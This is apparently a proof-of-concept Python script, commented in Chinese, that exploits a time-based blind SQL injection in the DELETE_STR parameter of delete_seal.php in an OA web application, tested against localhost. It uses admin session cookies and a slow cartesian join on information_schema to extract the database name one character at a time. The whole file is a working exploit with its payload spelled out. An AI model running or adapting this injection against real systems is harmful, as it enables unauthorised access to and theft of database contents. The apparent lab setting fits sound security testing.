import requests
from datetime import datetime,timedelta
characters = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789_!@#$%^&*()+-"
characters = "TD1_OA23" # 为减少测试时间，缩小范围
payloads = []

headers = {
    "sec-ch-ua": '"Not:A-Brand";v="99", "Chromium";v="112"',
    "sec-ch-ua-mobile": "?0",
    "sec-ch-ua-platform": '"Windows"',
    "Upgrade-Insecure-Requests": "1",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/112.0.5615.50 Safari/537.36",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7",
    "Sec-Fetch-Site": "same-origin",
    "Sec-Fetch-Mode": "navigate",
    "Sec-Fetch-Dest": "iframe",
    "Referer": "http://localhost:9999/general/index.php?isIE=0&modify_pwd=0",
    "Accept-Encoding": "gzip, deflate",
    "Accept-Language": "zh-CN,zh;q=0.9",
    "Cookie": "PHPSESSID=30nlgbu7obi2tacq5hda7du0g7; USER_NAME_COOKIE=admin; OA_USER_ID=admin; SID_1=ef575b50",
}
sql_name=""
for i in range(0,5):#减少测试时间，规定数据库长度为5。
    print("当前检测的数据库名字的第" + str(i+1) + "个字母是：")
    for char in characters:
        url = f"http://localhost:9999/general/system/seal_manage/iweboffice/delete_seal.php?DELETE_STR=1)and%20(substr(DATABASE(),{i + 1},1))=char({ord(char)})%20and%20(select%20count(*)%20from%20information_schema.columns%20A,information_schema.columns%20B)%20and(1)=(1"
        # print(url)
        start_time = datetime.now()
        response = requests.get(url, headers=headers)
        end_time = datetime.now()
        time_difference = end_time - start_time
        if time_difference > timedelta(seconds=4):
            print("存在时间注入")
            print(char)
            sql_name+=char
            break
        else:
            # print(char)
            pass

print(sql_name)

